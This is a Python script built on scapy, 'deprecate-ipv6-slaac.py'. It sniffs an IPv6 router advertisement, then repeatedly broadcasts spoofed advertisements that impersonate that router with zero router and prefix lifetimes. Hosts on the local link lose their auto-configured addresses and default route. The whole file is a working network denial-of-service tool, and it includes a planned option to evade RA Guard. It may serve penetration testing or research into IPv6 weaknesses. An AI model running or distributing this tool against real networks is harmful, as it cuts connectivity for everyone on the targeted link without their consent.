#! /usr/bin/env python
import optparse
import re
import socket
from scapy.all import *

NAME="deprecate-ipv6-slaac.py"
VERSION="0.1"

# Very lazy, but it works
def isValidIPv6Addr(addr):
	try:
		address = socket.inet_pton(socket.AF_INET6, addr)
	except socket.error:
		return False
	return True

# Extremely basic, but it should stop basic typos
def checkOptions(srcmac, srcv6, prefix, prefixlen, interval):
	errors = []

	if ((not srcmac) or (not re.match("([a-fA-F0-9]{2}[:|\-]?){6}", srcmac))):
		errors.append('Invalid source MAC specified')
	
	if ((not srcv6) or (not isValidIPv6Addr(srcv6))):
		errors.append('Invalid source v6 address specified')
	
	if (not prefix):
		errors.append('No prefix specified')

	if ((not prefixlen) or (prefixlen <= 0) or (prefixlen > 128)):
		errors.append('Invalid prefix length specified')
	
	if (interval <= 0):
		errors.append('Invalid Interval specified')

	return errors

def outputErrors(errors,premsg=None):
	print "Error(s): %s" % (premsg if premsg else '')
	print '  ' + '\n  '.join(errors) + '\n'

def deprecate(mac, linklocal, prefix, prefixlen, interval, iface):
	sendp(Ether(src=mac)/IPv6(src=linklocal,dst="ff02::01")/ICMPv6ND_RA(prf=0,routerlifetime=0)/ICMPv6NDOptPrefixInfo(prefix=prefix,prefixlen=prefixlen,preferredlifetime=0,validlifetime=0)/ICMPv6NDOptSrcLLAddr(lladdr=mac),
			loop=1, inter=interval, iface=iface)

def autodiscover_lfilter(pkt):
	# This is very wobbly, but it should do for now
	if ((len(pkt) < 1) or (pkt[1].type != 134)):
		return False

	return True

def autodeprecate(iface, interval):
	pkt = sniff(filter="icmp6",iface=iface,count=1,lfilter=autodiscover_lfilter)

	srcmac = pkt[0].src
	srcv6 = pkt[0][1].src
	prefix = pkt[0][1][1].prefix
	prefixlen = pkt[0][1][1].prefixlen

	print "Found IPv6 RA"
	print "Using: MAC: %s, Link Local: %s, Prefix: %s, PrefixLen %s" % (srcmac, srcv6, prefix, prefixlen)

	errors = checkOptions(srcmac, srcv6, prefix, prefixlen, interval)
	if (len(errors) > 0):
		outputErrors(premsg="Failed to use auto", errors=errors)
		return
	
	deprecate(srcmac, srcv6, prefix, prefixlen, interval, iface)

def main():
	# Force pcap to be used by scapy, otherwise we may not get all our packets
	conf.use_pcap = True

	parser = optparse.OptionParser(usage="Usage: %prog [options]", version=NAME + " " + VERSION)

	parser.add_option('-a', '--auto', action="store_true", dest="auto", default=False, help="Automatically find a v6 router, and use it's details to deprecate the network addresses. All options, except interface and interval, are ignored if this is invoked.")
	parser.add_option('-f', '--fragment', action='store_true', dest='fragment', default=False, help="Fragment the packet to avoid RA guard. Currently not implemented.")
	parser.add_option('-i', '--interface', action='store', dest='iface', default='eth0', help='Interface to receive/send packets. Defaults to use eth0.')
	parser.add_option('-m', '--source-mac', action='store', dest='srcmac', help='Source MAC address for RA packet. If not using auto this is required.')
	parser.add_option('-s', '--source-v6-addr', action='store', dest='srcv6', help='Source IPv6 link local address (Starts fe80:). If not using auto this is required.')
	parser.add_option('-p', '--prefix', action='store', dest='prefix', help='Target IPv6 prefix. If not using auto this is required.')
	parser.add_option('-l', '--prefix-len', action='store', type='int', default='64', dest='prefixlen', help='Target IPv6 prefix length. Almost certainly 64. If not using auto this is required. Defaults to 64.')
	parser.add_option('-t', '--interval', action='store', type='int', default=1, dest='interval', help='Interval (seconds) between sending our spoofed packets. You may want to back this off in some instances. Defaults to 1 second.')
	
	(options, args) = parser.parse_args()

	if (options.auto):
		autodeprecate(iface=options.iface, interval=options.interval)
		return

	errors = checkOptions(options.srcmac, options.srcv6, options.prefix, options.prefixlen, options.interval)
	if (len(errors) > 0):
		parser.print_help()
		outputErrors(errors)
		return

	deprecate(options.srcmac, options.srcv6, options.prefix, options.prefixlen, options.interval, options.iface)

if __name__ == '__main__':
	main()
